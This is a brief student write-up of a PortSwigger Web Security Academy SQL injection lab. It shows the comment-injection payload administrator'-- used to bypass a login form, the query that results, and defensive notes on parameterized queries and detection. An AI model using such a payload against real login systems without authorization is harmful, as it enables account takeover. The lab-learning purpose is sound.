# SQLi Lab 02 — Login Bypass

**Date:** 2026-05-28
**Difficulty:** Apprentice
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Tools used:** Browser

---

## Objective

Bypass the login form authentication without knowing the password.

---

## Vulnerability

The login query builds directly from user input without sanitization, allowing comment injection to ignore the password check entirely.

---

## Payload Used

```
administrator'--
```

Entered in the username field. Password field left blank.

---

## What Happened

The query became:

```sql
SELECT * FROM users WHERE username='administrator'--' AND password=''
```

Everything after `--` was ignored. Logged in as administrator.

---

## Defense / Detection Angle

- Parameterized queries prevent this completely
- Alert on `--` or `'` characters in login fields
- Rate limiting and account lockout policies

---

## What I Learned

Authentication logic is only as strong as its query construction. A single quote and comment sequence can eliminate password validation entirely.
